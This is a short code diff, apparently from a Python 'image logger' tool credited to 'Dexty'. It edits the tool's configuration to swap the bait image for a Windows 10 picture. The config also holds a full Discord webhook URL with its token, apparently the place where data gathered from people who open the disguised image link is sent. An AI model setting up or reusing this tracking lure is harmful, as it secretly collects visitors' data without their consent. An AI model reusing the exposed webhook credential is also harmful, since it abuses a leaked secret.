@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1383154637548421140/Fo_ACOuaMVuVUj9KIfgW-keJDyAjxeZzIDvRhLLNXxRpHsdajJXyNB4kcc1eeNjFqVSr",
-    "image": "https://tenor.com/en-GB/view/tgroll-trollge-gif-5952671324134299572", # You can also have a custom image by using a URL argument
+    "image": "https://www.computerworld.com/wp-content/uploads/2025/03/2140508-0-02986000-1742556775-Microsoft-Windows-10.png?resize=1024%2C576&quality=50&strip=all", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
